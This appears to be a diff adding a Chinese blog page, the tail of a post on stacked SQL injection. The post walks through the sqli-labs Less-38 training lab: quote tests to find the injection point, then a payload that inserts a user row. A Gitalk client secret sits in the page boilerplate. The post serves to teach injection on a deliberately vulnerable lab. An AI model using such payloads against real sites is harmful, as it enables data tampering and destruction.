+</blockquote>
+<p>当执行查询后，第一条显示查询信息，第二条则将整个表删除。</p>
+<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><h3 id="1-Less-38"><a href="#1-Less-38" class="headerlink" title="1. Less-38"></a>1. Less-38</h3><h3 id="1-1-判断类型"><a href="#1-1-判断类型" class="headerlink" title="1.1 判断类型"></a>1.1 判断类型</h3><ul>
+<li>get型注入</li>
+<li>有回显</li>
+<li>有错误提示</li>
+</ul>
+<p>综上初判使用联合注入</p>
+<h3 id="1-2-找注入点"><a href="#1-2-找注入点" class="headerlink" title="1.2 找注入点"></a>1.2 找注入点</h3><pre><code>?id=1 //正常
+?id=1&#39; //出错
+?id=1&#39;--+ //正常</code></pre><p>综上，注入点为?id=1’</p>
+<h3 id="1-3-获取数据库结构"><a href="#1-3-获取数据库结构" class="headerlink" title="1.3 获取数据库结构"></a>1.3 获取数据库结构</h3><p>通过爆库爆表爆字段来获知数据库结构，才能进行堆叠注入，此处省略 </p>
+<h3 id="1-4-堆叠注入"><a href="#1-4-堆叠注入" class="headerlink" title="1.4 堆叠注入"></a>1.4 堆叠注入</h3><p> 插入用户</p>
+<pre><code>?id=1&#39;;insert into users(id,username,password) values (&#39;21&#39;,&#39;zby&#39;,&#39;123&#39;)--+</code></pre><p><img src="https://pic.downk.cc/item/5f194d0514195aa59429a051.png" alt=""></p>
+
+            </div>
+            <hr/>
+
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        <p class="reprint-tip">
+            <i class="fa fa-exclamation-triangle"></i>&nbsp;&nbsp;
+            <span>转载规则</span>
+        </p>
+        
+            <div class="center-align">
+                <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank">
+                    <img alt=""
+                         style="border-width:0"
+                         src="https://i.creativecommons.org/l/by/4.0/88x31.png"/>
+                </a>
+            </div>
+            <br/>
+            <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
+                  property="dct:title" rel="dct:type">
+                    《高阶sql注入》
+                </span> 由
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/07/22/sqli-labs2/" property="cc:attributionName"
+               rel="cc:attributionURL">
+                fightingtree
+            </a> 采用
+            <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank">
+                知识共享署名 4.0 国际许可协议
+            </a>进行许可。
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: 'debc6373e622b493f954',
+        clientSecret: '5001da2e70b343177a3d07015d4478fd170b7037',
+        repo: 'fightingtree.github.io',
+        owner: 'fightingtree',
+        admin: "fightingtree",
+        id: '2020-07-22T18-39-07',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2020/07/28/attack1/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://pic.superbed.cn/item/5db3fa428b58bc7bf71e4760.jpg" class="responsive-img" alt="攻防世界(1)">
+                        
+                        <span class="card-title">攻防世界(1)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            攻防世界Web新手篇
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-28
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%AE%89%E5%85%A8/" class="post-category" target="_blank">
+                                    安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%AE%89%E5%85%A8/" target="_blank">
+                        <span class="chip bg-color">安全</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%94%BB%E9%98%B2/" target="_blank">
+                        <span class="chip bg-color">攻防</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/07/21/sqli-labs1/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://pic.superbed.cn/item/5db3fa558b58bc7bf71e4c4a.jpg" class="responsive-img" alt="sqli-labs">
+                        
+                        <span class="card-title">sqli-labs</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            sql注入(POST方法)
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-21
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%AE%89%E5%85%A8/" class="post-category" target="_blank">
+                                    安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%AE%89%E5%85%A8/" target="_blank">
+                        <span class="chip bg-color">安全</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: FightingTree<br />'
+            + '作者: fightingtree<br />'
+            + '链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fa fa-list"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).slideUp(500);
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).slideDown(500);
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+    
+
+</main>
+
+
+<footer class="page-footer bg-color">
+    <div class="container row left-align">
+        <div class="col s12 m8 l8 copy-right">
+            本站由&copy;<a href="https://fightingtree.github.io/" target="_blank">fightingtree</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a> 的
+            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>主题搭建.
+            </div>
+
+         <div class="col s12 m8 l8 copy-right">
+            
+                &nbsp;<i class="fa fa-area-chart"></i>&nbsp;
+            站点总字数:&nbsp;
+                <span class="white-color">234.8k</span>
+            
+            </div>
+        <div class="col s12 m8 l8 copy-right">
+            
+			
+                <br>
+                
+                <span id="busuanzi_container_site_pv">
+                    <i class="fa fa-heart-o"></i>
+            本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
+                </span>
+                
+                
+                <span id="busuanzi_container_site_uv">
+                    <i class="fa fa-users"></i>
+                    次,&nbsp;
+            访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
+                </span>
+                
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+    <a href="mailto:" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="https://weibo.com/u/6112857421?from=myfollow_all" class="tooltipped" target="_blank" data-tooltip="访问我的微博" data-position="top" data-delay="50">
+        <i class="fa fa-weibo"></i>
+    </a>
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', '');
+</script>
+
+
+
+    <script src="/libs/others/clicklove.js"></script>
+
+
+
+
+
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+
+
+</body>
+</html>
